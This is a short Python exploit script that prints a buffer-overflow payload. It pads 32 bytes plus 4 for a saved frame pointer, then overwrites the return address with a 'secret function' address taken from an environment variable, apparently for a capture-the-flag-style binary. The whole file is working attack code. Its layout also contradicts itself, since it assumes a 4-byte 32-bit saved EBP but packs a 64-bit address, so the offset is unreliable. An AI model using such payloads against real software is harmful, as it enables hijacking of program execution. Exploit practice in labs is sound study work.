import os
import struct

# Optionally load .env if running this script directly (see helper above)
# from env_helper import load_env_file
# load_env_file()

# Get the secret function address from environment
secret_addr = int(os.environ.get("SECRET_ADDR", "0x401196"), 16)

# 32 bytes buffer + 4 bytes saved EBP (often, on x86) = 36 bytes, then return address
payload = b"A" * 32
payload += b"B" * 4
payload += struct.pack("<Q", secret_addr)  # Use <I for 32-bit, <Q for 64-bit

print(payload)